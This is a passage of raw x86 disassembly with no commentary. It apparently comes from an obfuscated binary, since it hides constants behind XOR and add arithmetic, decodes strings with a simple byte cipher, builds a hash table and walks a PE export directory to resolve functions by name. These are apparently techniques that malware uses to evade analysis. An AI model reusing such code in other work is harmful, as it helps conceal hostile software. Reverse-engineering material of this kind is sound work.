  42756d:	sub    esp,0x21c
  427573:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  42757a:	mov    DWORD PTR [ebp-0x14],0xf89c85b8
  427581:	mov    eax,DWORD PTR [ebp+0x10]
  427584:	mov    eax,DWORD PTR [ebp-0x4]
  427587:	mov    ecx,DWORD PTR [ebp+0x8]
  42758a:	push   esi
  42758b:	push   edi
  42758c:	mov    edi,0x7510899
  427591:	xor    eax,edi
  427593:	mov    esi,0x3272e0
  427598:	add    eax,esi
  42759a:	cmp    eax,ecx
  42759c:	mov    eax,DWORD PTR [ebp-0x4]
  42759f:	jne    0x4275aa
  4275a1:	xor    eax,edi
  4275a3:	add    eax,esi
  4275a5:	jmp    0x427656
  4275aa:	mov    ecx,DWORD PTR [ebp+0xc]
  4275ad:	xor    eax,edi
  4275af:	add    eax,esi
  4275b1:	cmp    eax,ecx
  4275b3:	jne    0x4275ba
  4275b5:	mov    eax,DWORD PTR [ebp-0x4]
  4275b8:	jmp    0x4275a1
  4275ba:	lea    eax,[ebp-0x21c]
  4275c0:	mov    DWORD PTR [ebp-0x8],eax
  4275c3:	mov    eax,DWORD PTR [ebp+0xc]
  4275c6:	mov    DWORD PTR [ebp-0x10],eax
  4275c9:	mov    eax,DWORD PTR [ebp-0x4]
  4275cc:	xor    eax,edi
  4275ce:	add    eax,esi
  4275d0:	mov    DWORD PTR [ebp+0x10],eax
  4275d3:	mov    eax,DWORD PTR [ebp+0xc]
  4275d6:	push   ebx
  4275d7:	call   0x4272c7
  4275dc:	mov    ebx,eax
  4275de:	mov    eax,DWORD PTR [ebp+0x8]
  4275e1:	mov    eax,DWORD PTR [eax+0x14]
  4275e4:	jmp    0x42763e
  4275e6:	mov    eax,DWORD PTR [ebp+0xc]
  4275e9:	sub    eax,0x8
  4275ec:	mov    DWORD PTR [ebp-0xc],eax
  4275ef:	mov    eax,DWORD PTR [ebp-0xc]
  4275f2:	mov    eax,DWORD PTR [eax+0x28]
  4275f5:	call   0x4271af
  4275fa:	mov    DWORD PTR [ebp+0x10],eax
  4275fd:	push   DWORD PTR [ebp+0x10]
  427600:	mov    edx,DWORD PTR [ebp-0x8]
  427603:	call   0x427356
  427608:	mov    eax,DWORD PTR [ebp-0x4]
  42760b:	xor    eax,edi
  42760d:	add    eax,esi
  42760f:	cmp    eax,ebx
  427611:	jne    0x42761b
  427613:	mov    eax,DWORD PTR [ebp-0x8]
  427616:	call   0x42723d
  42761b:	mov    eax,DWORD PTR [ebp-0x14]
  42761e:	xor    eax,edi
  427620:	add    eax,esi
  427622:	push   eax
  427623:	push   DWORD PTR [ebp-0x10]
  427626:	push   DWORD PTR [ebp-0x8]
  427629:	call   0x426f41
  42762e:	mov    ecx,DWORD PTR [ebp-0x4]
  427631:	xor    ecx,edi
  427633:	add    ecx,esi
  427635:	cmp    eax,ecx
  427637:	je     0x42765c
  427639:	mov    eax,DWORD PTR [ebp+0xc]
  42763c:	mov    eax,DWORD PTR [eax]
  42763e:	mov    DWORD PTR [ebp+0xc],eax
  427641:	mov    eax,DWORD PTR [ebp+0x8]
  427644:	mov    ecx,DWORD PTR [ebp+0xc]
  427647:	add    eax,0x14
  42764a:	cmp    ecx,eax
  42764c:	jne    0x4275e6
  42764e:	mov    eax,DWORD PTR [ebp-0x4]
  427651:	xor    eax,edi
  427653:	add    eax,esi
  427655:	pop    ebx
  427656:	pop    edi
  427657:	pop    esi
  427658:	leave  
  427659:	ret    0xc
  42765c:	mov    eax,DWORD PTR [ebp-0xc]
  42765f:	mov    eax,DWORD PTR [eax+0x18]
  427662:	jmp    0x427655
  427664:	push   ebp
  427665:	mov    ebp,esp
  427667:	mov    eax,DWORD PTR [ebp+0xc]
  42766a:	sub    esp,0x10
  42766d:	cmp    DWORD PTR [ebp+0x8],0x0
  427671:	push   ebx
  427672:	push   esi
  427673:	push   edi
  427674:	je     0x427729
  42767a:	test   eax,eax
  42767c:	je     0x427729
  427682:	movzx  eax,WORD PTR [eax+0x20]
  427686:	mov    ecx,eax
  427688:	mov    DWORD PTR [ebp-0x10],eax
  42768b:	xor    edx,edx
  42768d:	and    DWORD PTR [ebp-0x8],edx
  427690:	mov    eax,0x8a8c
  427695:	xor    ecx,eax
  427697:	add    ecx,0x3b50
  42769d:	mov    DWORD PTR [ebp-0xc],ecx
  4276a0:	and    DWORD PTR [ebp-0x4],0x0
  4276a4:	xor    ecx,ecx
  4276a6:	push   0x78
  4276a8:	pop    edi
  4276a9:	cmp    cx,WORD PTR [ebp-0xc]
  4276ad:	jae    0x427713
  4276af:	lea    esi,[edx-0x3b50]
  4276b5:	xor    esi,eax
  4276b7:	movzx  ecx,WORD PTR [ebp-0x4]
  4276bb:	mov    ebx,DWORD PTR [ebp+0xc]
  4276be:	lea    ecx,[ebx+ecx*4]
  4276c1:	cmp    WORD PTR [ecx+0x2],si
  4276c5:	jne    0x4276fe
  4276c7:	movzx  ecx,WORD PTR [ecx]
  4276ca:	mov    edi,0x4e3c
  4276cf:	cmp    cx,di
  4276d2:	jne    0x4276e0
  4276d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4276d7:	movzx  edi,dx
  4276da:	cmp    BYTE PTR [edi+ebx*1],0x0
  4276de:	je     0x42770d
  4276e0:	mov    ebx,DWORD PTR [ebp+0x8]
  4276e3:	movzx  edi,dx
  4276e6:	movsx  di,BYTE PTR [edi+ebx*1]
  4276eb:	mov    ebx,0x3b50
  4276f0:	sub    di,bx
  4276f3:	xor    di,ax
  4276f6:	cmp    cx,di
  4276f9:	je     0x42770d
  4276fb:	push   0x7a
  4276fd:	pop    edi
  4276fe:	inc    DWORD PTR [ebp-0x4]
  427701:	mov    cx,WORD PTR [ebp-0xc]
  427705:	cmp    WORD PTR [ebp-0x4],cx
  427709:	jb     0x4276b7
  42770b:	jmp    0x427713
  42770d:	inc    DWORD PTR [ebp-0x8]
  427710:	push   0x79
  427712:	pop    edi
  427713:	mov    esi,DWORD PTR [ebp+0x8]
  427716:	movzx  ecx,dx
  427719:	cmp    BYTE PTR [ecx+esi*1],0x0
  42771d:	je     0x427732
  42771f:	inc    edx
  427720:	cmp    edi,0x7a
  427723:	jne    0x4276a0
  427729:	xor    eax,eax
  42772b:	pop    edi
  42772c:	pop    esi
  42772d:	pop    ebx
  42772e:	leave  
  42772f:	ret    0x8
  427732:	mov    ecx,DWORD PTR [ebp-0x8]
  427735:	add    ecx,0xffffc4b0
  42773b:	xor    cx,ax
  42773e:	xor    eax,eax
  427740:	cmp    cx,WORD PTR [ebp-0x10]
  427744:	sete   al
  427747:	jmp    0x42772b
  427749:	push   ebp
  42774a:	mov    ebp,esp
  42774c:	sub    esp,0x50
  42774f:	push   edi
  427750:	mov    edi,eax
  427752:	mov    eax,DWORD PTR [edi+0x1a8]
  427758:	cmp    DWORD PTR [eax],0x0
  42775b:	jne    0x427764
  42775d:	xor    eax,eax
  42775f:	jmp    0x427894
  427764:	push   0x2c
  427766:	push   DWORD PTR [ebp+0x8]
  427769:	call   0x42750e
  42776e:	mov    edx,DWORD PTR [edi+0x1ac]
  427774:	lea    eax,[edi+0x22]
  427777:	mov    DWORD PTR [ebp-0x4c],eax
  42777a:	lea    eax,[edi+0x44]
  42777d:	mov    DWORD PTR [ebp-0x48],eax
  427780:	lea    eax,[edi+0x66]
  427783:	mov    DWORD PTR [ebp-0x44],eax
  427786:	lea    eax,[edi+0x88]
  42778c:	mov    DWORD PTR [ebp-0x40],eax
  42778f:	lea    eax,[edi+0xaa]
  427795:	mov    DWORD PTR [ebp-0x3c],eax
  427798:	lea    eax,[edi+0xcc]
  42779e:	mov    DWORD PTR [ebp-0x38],eax
  4277a1:	lea    eax,[edi+0xee]
  4277a7:	mov    DWORD PTR [ebp-0x34],eax
  4277aa:	lea    eax,[edi+0x110]
  4277b0:	mov    DWORD PTR [ebp-0x30],eax
  4277b3:	lea    eax,[edi+0x132]
  4277b9:	mov    DWORD PTR [ebp-0x2c],eax
  4277bc:	lea    eax,[edi+0x154]
  4277c2:	push   edi
  4277c3:	mov    DWORD PTR [ebp-0x50],edi
  4277c6:	mov    DWORD PTR [ebp-0x28],eax
  4277c9:	call   0x4278c8
  4277ce:	push   eax
  4277cf:	mov    eax,DWORD PTR [edi+0x1a8]
  4277d5:	push   DWORD PTR [eax]
  4277d7:	call   0x42756a
  4277dc:	mov    DWORD PTR [ebp-0x10],eax
  4277df:	test   eax,eax
  4277e1:	je     0x427894
  4277e7:	mov    ecx,DWORD PTR [eax+0x3c]
  4277ea:	push   ebx
  4277eb:	push   esi
  4277ec:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  4277f0:	add    esi,eax
  4277f2:	mov    edi,DWORD PTR [esi+0x24]
  4277f5:	mov    ecx,DWORD PTR [esi+0x1c]
  4277f8:	mov    edx,DWORD PTR [esi+0x20]
  4277fb:	mov    ebx,DWORD PTR [esi+0x18]
  4277fe:	add    edi,eax
  427800:	mov    DWORD PTR [ebp-0x20],edi
  427803:	mov    edi,DWORD PTR [esi+0x14]
  427806:	add    ecx,eax
  427808:	add    edx,eax
  42780a:	mov    DWORD PTR [ebp-0xc],ecx
  42780d:	mov    DWORD PTR [ebp-0x1c],edx
  427810:	mov    DWORD PTR [ebp-0x8],edi
  427813:	cmp    edi,ebx
  427815:	ja     0x42781a
  427817:	mov    DWORD PTR [ebp-0x8],ebx
  42781a:	xor    ebx,ebx
  42781c:	mov    DWORD PTR [ebp-0x18],ebx
  42781f:	cmp    DWORD PTR [ebp-0x8],ebx
  427822:	jbe    0x427892
  427824:	jmp    0x427829
  427826:	mov    edx,DWORD PTR [ebp-0x1c]
  427829:	mov    edi,DWORD PTR [ebp-0x20]
  42782c:	movzx  edi,WORD PTR [edi+ebx*2]
  427830:	cmp    ebx,DWORD PTR [esi+0x18]
  427833:	jae    0x427892
  427835:	cmp    edi,DWORD PTR [esi+0x14]
  427838:	jae    0x427892
  42783a:	mov    ebx,DWORD PTR [edx+ebx*4]
  42783d:	mov    edx,DWORD PTR [ebp+0x8]
  427840:	mov    edi,DWORD PTR [ecx+edi*4]
  427843:	mov    DWORD PTR [ebp-0x4],edx
  427846:	lea    edx,[ebp-0x50]
  427849:	add    ebx,eax
  42784b:	add    edi,eax
  42784d:	sub    edx,DWORD PTR [ebp+0x8]
  427850:	mov    DWORD PTR [ebp-0x14],0xb
  427857:	mov    DWORD PTR [ebp-0x24],edx
  42785a:	mov    edx,DWORD PTR [ebp-0x4]
  42785d:	cmp    DWORD PTR [edx],0x0
  427860:	jne    0x42787d
  427862:	mov    eax,DWORD PTR [ebp-0x24]
  427865:	push   DWORD PTR [eax+edx*1]
  427868:	push   ebx
  427869:	call   0x427664
  42786e:	mov    ecx,DWORD PTR [ebp-0xc]
  427871:	test   eax,eax
  427873:	je     0x42787a
  427875:	mov    eax,DWORD PTR [ebp-0x4]
  427878:	mov    DWORD PTR [eax],edi
  42787a:	mov    eax,DWORD PTR [ebp-0x10]
  42787d:	add    DWORD PTR [ebp-0x4],0x4
  427881:	dec    DWORD PTR [ebp-0x14]
  427884:	jne    0x42785a
  427886:	mov    ebx,DWORD PTR [ebp-0x18]
  427889:	inc    ebx
  42788a:	mov    DWORD PTR [ebp-0x18],ebx
  42788d:	cmp    ebx,DWORD PTR [ebp-0x8]
  427890:	jb     0x427826
  427892:	pop    esi
  427893:	pop    ebx
  427894:	pop    edi
  427895:	leave  
  427896:	ret    0x4
  427899:	push   ebp
  42789a:	mov    ebp,esp
  42789c:	mov    eax,DWORD PTR [ebp+0x8]
  42789f:	push   esi
  4278a0:	push   DWORD PTR [eax+0x1d8]
  4278a6:	lea    esi,[eax+0x198]
  4278ac:	mov    eax,DWORD PTR [ebp+0x8]
  4278af:	call   0x427749
  4278b4:	mov    ecx,DWORD PTR [esi]
  4278b6:	mov    DWORD PTR [ecx],eax
  4278b8:	mov    eax,DWORD PTR [esi]
  4278ba:	xor    ecx,ecx
  4278bc:	cmp    DWORD PTR [eax],ecx
  4278be:	pop    esi
  4278bf:	setne  cl
  4278c2:	mov    eax,ecx
  4278c4:	pop    ebp
  4278c5:	ret    0x4
  4278c8:	mov    ecx,DWORD PTR [edi+0x188]
  4278ce:	push   ebx
  4278cf:	jmp    0x4278e4
  4278d1:	xor    eax,0x8a8c
  4278d6:	add    eax,0x3b50
  4278db:	mov    WORD PTR [ecx],ax
  4278de:	add    ecx,0x2
  4278e1:	add    edx,0x2
  4278e4:	movzx  eax,WORD PTR [edx]
  4278e7:	mov    ebx,0x4e3c
  4278ec:	cmp    ax,bx
  4278ef:	jne    0x4278d1
  4278f1:	xor    eax,eax
  4278f3:	mov    WORD PTR [ecx],ax
  4278f6:	mov    eax,DWORD PTR [edi+0x188]
  4278fc:	pop    ebx
  4278fd:	ret    
  4278fe:	push   edi
  4278ff:	mov    edi,eax
  427901:	mov    eax,DWORD PTR [esi+0x188]
  427907:	shl    edi,0x6
  42790a:	add    eax,edi
  42790c:	jmp    0x427918
  42790e:	xor    cl,0x73
  427911:	sub    cl,0x9
  427914:	mov    BYTE PTR [eax],cl
  427916:	inc    eax
  427917:	inc    edx
  427918:	mov    cl,BYTE PTR [edx]
  42791a:	cmp    cl,0x7a
  42791d:	jne    0x42790e
  42791f:	mov    BYTE PTR [eax],0x0
  427922:	mov    eax,DWORD PTR [esi+0x188]
  427928:	add    eax,edi
  42792a:	pop    edi
  42792b:	ret    
  42792c:	push   ebp
  42792d:	mov    ebp,esp
  42792f:	sub    esp,0x38
  427932:	push   ebx
  427933:	mov    ebx,0xf89c85b9
  427938:	mov    DWORD PTR [ebp-0x4],ebx
  42793b:	lea    eax,[ebx-0x1]
  42793e:	push   esi
  42793f:	mov    DWORD PTR [ebp-0x24],eax
  427942:	mov    ecx,DWORD PTR [ebp-0x4]
  427945:	mov    edx,DWORD PTR [ebp+0x8]
  427948:	mov    esi,0x7510899
  42794d:	push   edi
  42794e:	xor    ecx,esi
  427950:	mov    edi,0x3272e0
  427955:	add    ecx,edi
  427957:	cmp    edx,ecx
  427959:	je     0x427ac7
  42795f:	mov    ecx,DWORD PTR [ebp-0x4]
  427962:	mov    edx,DWORD PTR [ebp+0xc]
  427965:	xor    ecx,esi
  427967:	add    ecx,edi
  427969:	cmp    edx,ecx
  42796b:	je     0x427ac7
  427971:	mov    ecx,DWORD PTR [ebp+0x10]
  427974:	mov    DWORD PTR [ebp-0x18],ecx
  427977:	mov    ecx,DWORD PTR [ebp+0xc]
  42797a:	mov    DWORD PTR [ebp-0x14],ecx
  42797d:	mov    ecx,DWORD PTR [ebp+0x8]
  427980:	mov    DWORD PTR [ebp-0x1c],0xf89c8504
  427987:	mov    DWORD PTR [ebp-0x20],eax
  42798a:	mov    DWORD PTR [ebp-0x10],ebx
  42798d:	mov    DWORD PTR [ebp+0xc],eax
  427990:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  427997:	mov    eax,DWORD PTR [ebp+0xc]
  42799a:	mov    DWORD PTR [ebp-0xc],ecx
  42799d:	xor    eax,esi
  42799f:	mov    ecx,0xffcd8d20
  4279a4:	sub    ecx,eax
  4279a6:	add    ecx,DWORD PTR [ebp-0x14]
  4279a9:	mov    DWORD PTR [ebp+0x8],ecx
  4279ac:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  4279b3:	jmp    0x427ab7
  4279b8:	mov    eax,DWORD PTR [ebp+0xc]
  4279bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4279be:	xor    eax,esi
  4279c0:	xor    ecx,esi
  4279c2:	lea    ecx,[eax+ecx*1+0x64e5c0]
  4279c9:	mov    eax,DWORD PTR [ebp+0x8]
  4279cc:	xor    edx,edx
  4279ce:	div    ecx
  4279d0:	mov    eax,DWORD PTR [ebp+0x10]
  4279d3:	mov    ecx,DWORD PTR [ebp+0xc]
  4279d6:	xor    eax,esi
  4279d8:	xor    ecx,esi
  4279da:	sub    eax,ecx
  4279dc:	cmp    edx,eax
  4279de:	jne    0x427a73
  4279e4:	mov    eax,DWORD PTR [ebp+0x8]
  4279e7:	add    eax,DWORD PTR [ebp-0xc]
  4279ea:	mov    dl,BYTE PTR [eax]
  4279ec:	mov    eax,DWORD PTR [ebp-0x10]
  4279ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4279f2:	xor    eax,esi
  4279f4:	xor    ecx,esi
  4279f6:	add    eax,edi
  4279f8:	add    ecx,edi
  4279fa:	cmp    eax,ecx
  4279fc:	jae    0x427a44
  4279fe:	lea    ecx,[eax-0x3272e0]
  427a04:	mov    DWORD PTR [ebp-0x4],ecx
  427a07:	mov    ebx,DWORD PTR [ebp-0x4]
  427a0a:	xor    ebx,esi
  427a0c:	add    ebx,0x7f55d8fb
  427a12:	lea    ecx,[ebp+eax*4-0x38]
  427a16:	mov    DWORD PTR [ecx],ebx
  427a18:	mov    ebx,DWORD PTR [ecx]
  427a1a:	cmp    ebx,0x244ecbda
  427a20:	jbe    0x427a2a
  427a22:	add    DWORD PTR [ecx],0x405fc1d
  427a28:	jmp    0x427a30
  427a2a:	add    DWORD PTR [ecx],0xfdaf43e3
  427a30:	mov    ecx,DWORD PTR [ebp-0x8]
  427a33:	xor    ecx,esi
  427a35:	inc    eax
  427a36:	inc    DWORD PTR [ebp-0x4]
  427a39:	add    ecx,edi
  427a3b:	cmp    eax,ecx
  427a3d:	jb     0x427a07
  427a3f:	mov    ebx,0xf89c85b9
  427a44:	mov    eax,DWORD PTR [ebp-0x18]
  427a47:	test   eax,eax
  427a49:	jne    0x427a53
  427a4b:	xor    dl,0x73
  427a4e:	sub    dl,0x9
  427a51:	jmp    0x427a69
  427a53:	mov    eax,DWORD PTR [ebp-0x1c]
  427a56:	xor    al,0x99
  427a58:	mov    cl,0x20
  427a5a:	sub    cl,al
  427a5c:	add    dl,cl
  427a5e:	mov    ecx,DWORD PTR [ebp-0x20]
  427a61:	xor    cl,0x99
  427a64:	sub    cl,0x20
  427a67:	ror    dl,cl
  427a69:	xor    eax,eax
  427a6b:	mov    eax,DWORD PTR [ebp+0x8]
  427a6e:	add    eax,DWORD PTR [ebp-0xc]
  427a71:	mov    BYTE PTR [eax],dl
  427a73:	mov    eax,DWORD PTR [ebp+0x8]
  427a76:	mov    ecx,DWORD PTR [ebp-0x10]
  427a79:	sub    eax,edi
  427a7b:	xor    eax,esi
  427a7d:	cmp    eax,ecx
  427a7f:	jne    0x427aa5
  427a81:	mov    eax,DWORD PTR [ebp+0x10]
  427a84:	mov    ecx,DWORD PTR [ebp+0xc]
  427a87:	xor    eax,esi
  427a89:	xor    ecx,esi
  427a8b:	sub    eax,ecx
  427a8d:	sub    eax,edi
  427a8f:	xor    eax,esi
  427a91:	mov    DWORD PTR [ebp+0x10],eax
  427a94:	mov    eax,DWORD PTR [ebp+0xc]
  427a97:	xor    eax,esi
  427a99:	mov    ecx,0xffcd8d20
  427a9e:	sub    ecx,eax
  427aa0:	add    ecx,DWORD PTR [ebp-0x14]
  427aa3:	jmp    0x427ab4
  427aa5:	mov    eax,DWORD PTR [ebp+0xc]
  427aa8:	xor    eax,esi
  427aaa:	mov    ecx,0xffcd8d20
  427aaf:	sub    ecx,eax
  427ab1:	add    ecx,DWORD PTR [ebp+0x8]
  427ab4:	mov    DWORD PTR [ebp+0x8],ecx
  427ab7:	mov    eax,DWORD PTR [ebp+0x10]
  427aba:	cmp    eax,ebx
  427abc:	jne    0x4279b8
  427ac2:	mov    eax,DWORD PTR [ebp-0x24]
  427ac5:	jmp    0x427aca
  427ac7:	mov    eax,DWORD PTR [ebp-0x4]
  427aca:	xor    eax,esi
  427acc:	add    eax,edi
  427ace:	pop    edi
  427acf:	pop    esi
  427ad0:	pop    ebx
  427ad1:	leave  
  427ad2:	ret    0xc
  427ad5:	push   ebp
  427ad6:	mov    ebp,esp
  427ad8:	sub    esp,0x14
  427adb:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427ae2:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  427ae9:	mov    eax,DWORD PTR [ebx]
  427aeb:	mov    DWORD PTR [ebp-0x8],eax
  427aee:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  427af5:	push   esi
  427af6:	push   edi
  427af7:	mov    DWORD PTR [ebp-0x14],0xead718d9
  427afe:	mov    edi,DWORD PTR [ebp-0x4]
  427b01:	mov    ecx,DWORD PTR [ebp-0x10]
  427b04:	mov    eax,0x7510899
  427b09:	xor    edi,eax
  427b0b:	mov    edx,0x3272e0
  427b10:	xor    ecx,eax
  427b12:	add    edi,edx
  427b14:	add    ecx,edx
  427b16:	imul   edi,ecx
  427b19:	jmp    0x427b61
  427b1b:	mov    ecx,DWORD PTR [ebp-0x8]
  427b1e:	mov    esi,DWORD PTR [ebp-0x4]
  427b21:	xor    ecx,eax
  427b23:	xor    esi,eax
  427b25:	add    ecx,edx
  427b27:	add    esi,edx
  427b29:	test   esi,ecx
  427b2b:	mov    esi,DWORD PTR [ebp-0x8]
  427b2e:	mov    ecx,DWORD PTR [ebp-0x4]
  427b31:	je     0x427b48
  427b33:	xor    ecx,eax
  427b35:	xor    esi,eax
  427b37:	add    ecx,edx
  427b39:	add    esi,edx
  427b3b:	shr    esi,cl
  427b3d:	mov    ecx,DWORD PTR [ebp-0x14]
  427b40:	xor    ecx,eax
  427b42:	add    ecx,edx
  427b44:	xor    esi,ecx
  427b46:	jmp    0x427b52
  427b48:	xor    esi,eax
  427b4a:	xor    ecx,eax
  427b4c:	add    esi,edx
  427b4e:	add    ecx,edx
  427b50:	shr    esi,cl
  427b52:	mov    DWORD PTR [ebp-0x8],esi
  427b55:	mov    ecx,DWORD PTR [ebp-0x4]
  427b58:	xor    ecx,eax
  427b5a:	lea    edi,[edi+ecx*1+0x3272e0]
  427b61:	mov    ecx,DWORD PTR [ebp-0xc]
  427b64:	mov    esi,DWORD PTR [ebp-0x4]
  427b67:	xor    esi,eax
  427b69:	xor    ecx,eax
  427b6b:	sub    ecx,esi
  427b6d:	cmp    edi,ecx
  427b6f:	jbe    0x427b1b
  427b71:	mov    eax,DWORD PTR [ebp-0x8]
  427b74:	pop    edi
  427b75:	mov    DWORD PTR [ebx],eax
  427b77:	mov    eax,DWORD PTR [ebp-0x8]
  427b7a:	pop    esi
  427b7b:	leave  
  427b7c:	ret    
  427b7d:	push   ebp
  427b7e:	mov    ebp,esp
  427b80:	sub    esp,0x420
  427b86:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  427b8d:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  427b94:	mov    DWORD PTR [ebp-0x18],0xf89c86b9
  427b9b:	push   ebx
  427b9c:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  427ba3:	mov    eax,DWORD PTR [ebp-0x14]
  427ba6:	push   esi
  427ba7:	mov    esi,0x7510899
  427bac:	push   edi
  427bad:	xor    eax,esi
  427baf:	mov    edi,0x3272e0
  427bb4:	add    eax,edi
  427bb6:	mov    DWORD PTR [ebp-0x8],eax
  427bb9:	mov    DWORD PTR [ebp-0x20],0xf89c85b1
  427bc0:	mov    DWORD PTR [ebp-0x4],0xead718d9
  427bc7:	mov    DWORD PTR [ebp-0x10],0x8
  427bce:	mov    ecx,ecx
  427bd0:	mov    eax,DWORD PTR [ebp-0xc]
  427bd3:	mov    ecx,DWORD PTR [ebp-0x14]
  427bd6:	xor    eax,esi
  427bd8:	xor    ecx,esi
  427bda:	add    eax,edi
  427bdc:	add    ecx,edi
  427bde:	imul   eax,ecx
  427be1:	jmp    0x427c14
  427be3:	mov    eax,DWORD PTR [ebp-0x4]
  427be6:	sub    eax,edi
  427be8:	xor    eax,esi
  427bea:	mov    DWORD PTR [ebp-0x8],eax
  427bed:	lea    ebx,[ebp-0x8]
  427bf0:	call   0x427ad5
  427bf5:	mov    DWORD PTR [ebp-0x8],eax
  427bf8:	mov    eax,DWORD PTR [ebp-0x8]
  427bfb:	mov    ecx,DWORD PTR [ebp-0x4]
  427bfe:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  427c05:	mov    eax,DWORD PTR [ebp-0xc]
  427c08:	mov    ecx,DWORD PTR [ebp-0x4]
  427c0b:	xor    eax,esi
  427c0d:	lea    eax,[eax+ecx*1+0x3272e0]
  427c14:	mov    DWORD PTR [ebp-0x4],eax
  427c17:	mov    eax,DWORD PTR [ebp-0x18]
  427c1a:	mov    ecx,DWORD PTR [ebp-0xc]
  427c1d:	xor    ecx,esi
  427c1f:	xor    eax,esi
  427c21:	sub    eax,ecx
  427c23:	mov    ecx,DWORD PTR [ebp-0x4]
  427c26:	cmp    ecx,eax
  427c28:	jbe    0x427be3
  427c2a:	mov    eax,DWORD PTR [ebp-0x1c]
  427c2d:	xor    eax,esi
  427c2f:	add    eax,edi
  427c31:	mov    DWORD PTR [ebp-0x8],eax
  427c34:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  427c3b:	mov    ebx,ebx
  427c3d:	jmp    0x427ca0
  427c3f:	mov    ecx,DWORD PTR [ebp-0x20]
  427c42:	mov    eax,DWORD PTR [ebp-0x8]
  427c45:	xor    ecx,esi
  427c47:	add    ecx,edi
  427c49:	shr    eax,cl
  427c4b:	mov    DWORD PTR [ebp-0x4],eax
  427c4e:	mov    eax,DWORD PTR [ebp+0x8]
  427c51:	mov    cl,BYTE PTR [eax]
  427c53:	mov    BYTE PTR [ebp+0xb],cl
  427c56:	mov    cl,BYTE PTR [ebp+0xb]
  427c59:	mov    edx,DWORD PTR [ebp-0x8]
  427c5c:	movzx  ecx,cl
  427c5f:	xor    ecx,edx
  427c61:	mov    DWORD PTR [ebp+0x8],ecx
  427c64:	mov    ecx,DWORD PTR [ebp-0x18]
  427c67:	mov    edx,DWORD PTR [ebp+0x8]
  427c6a:	xor    ecx,esi
  427c6c:	add    ecx,edi
  427c6e:	and    ecx,edx
  427c70:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427c77:	mov    edx,DWORD PTR [ebp-0x4]
  427c7a:	xor    ecx,edx
  427c7c:	mov    DWORD PTR [ebp-0x8],ecx
  427c7f:	mov    ecx,DWORD PTR [ebp-0xc]
  427c82:	xor    ecx,esi
  427c84:	lea    eax,[eax+ecx*1+0x3272e0]
  427c8b:	mov    DWORD PTR [ebp+0x8],eax
  427c8e:	mov    eax,DWORD PTR [ebp-0xc]
  427c91:	xor    eax,esi
  427c93:	mov    ecx,0xffcd8d20
  427c98:	sub    ecx,eax
  427c9a:	add    ecx,DWORD PTR [ebp-0x10]
  427c9d:	mov    DWORD PTR [ebp-0x10],ecx
  427ca0:	mov    eax,DWORD PTR [ebp-0x14]
  427ca3:	mov    ecx,DWORD PTR [ebp-0x10]
  427ca6:	xor    eax,esi
  427ca8:	add    eax,edi
  427caa:	cmp    ecx,eax
  427cac:	jne    0x427c3f
  427cae:	mov    eax,DWORD PTR [ebp-0x1c]
  427cb1:	mov    ecx,DWORD PTR [ebp-0x8]
  427cb4:	xor    eax,esi
  427cb6:	add    eax,edi
  427cb8:	pop    edi
  427cb9:	pop    esi
  427cba:	xor    eax,ecx
  427cbc:	pop    ebx
  427cbd:	leave  
  427cbe:	ret    0x4
  427cc1:	push   ebp
  427cc2:	mov    ebp,esp
  427cc4:	mov    eax,DWORD PTR [ebp+0x1c]
  427cc7:	mov    ecx,DWORD PTR [ebp+0x8]
  427cca:	mov    edx,DWORD PTR [ebp+0x10]
  427ccd:	mov    eax,DWORD PTR [eax+0x190]
  427cd3:	mov    eax,DWORD PTR [eax]
  427cd5:	sub    esp,0x64
  427cd8:	push   ebx
  427cd9:	push   esi
  427cda:	push   edi
  427cdb:	mov    edi,0x7510899
  427ce0:	xor    ecx,edi
  427ce2:	mov    ebx,0x3272e0
  427ce7:	add    ecx,ebx
  427ce9:	cmp    ecx,edx
  427ceb:	jne    0x427cfc
  427ced:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  427cf7:	jmp    0x4281f9
  427cfc:	mov    ecx,DWORD PTR [ebp+0x8]
  427cff:	mov    esi,DWORD PTR [ebp+0x14]
  427d02:	mov    edx,DWORD PTR [esi]
  427d04:	xor    ecx,edi
  427d06:	add    ecx,ebx
  427d08:	cmp    edx,ecx
  427d0a:	je     0x4281b4
  427d10:	mov    ecx,DWORD PTR [ebp+0x1c]
  427d13:	mov    DWORD PTR [ebp-0x1c],eax
  427d16:	mov    DWORD PTR [ebp+0x1c],ecx
  427d19:	mov    ecx,DWORD PTR [ebp+0x18]
  427d1c:	mov    eax,DWORD PTR [esi]
  427d1e:	mov    DWORD PTR [ebp-0x20],eax
  427d21:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  427d28:	mov    edx,0xf89c85b8
  427d2d:	mov    DWORD PTR [ebp-0x8],edx
  427d30:	mov    eax,DWORD PTR [ebp+0x1c]
  427d33:	mov    DWORD PTR [ebp+0x1c],eax
  427d36:	mov    eax,DWORD PTR [ebp+0x1c]
  427d39:	mov    eax,DWORD PTR [eax+0x190]
  427d3f:	mov    eax,DWORD PTR [eax]
  427d41:	mov    DWORD PTR [ebp-0x24],ecx
  427d44:	mov    ecx,DWORD PTR [ebp+0x1c]
  427d47:	mov    ecx,DWORD PTR [ecx+0x190]
  427d4d:	mov    ecx,DWORD PTR [ecx]
  427d4f:	add    ecx,DWORD PTR [eax+0x3c]
  427d52:	mov    DWORD PTR [ebp+0x10],ecx
  427d55:	mov    eax,DWORD PTR [ebp+0x8]
  427d58:	xor    eax,edi
  427d5a:	add    eax,ebx
  427d5c:	mov    DWORD PTR [ebp-0x4],eax
  427d5f:	mov    eax,DWORD PTR [ebp+0x8]
  427d62:	xor    eax,edi
  427d64:	add    eax,ebx
  427d66:	mov    DWORD PTR [ebp+0x18],eax
  427d69:	mov    eax,DWORD PTR [ebp+0x10]
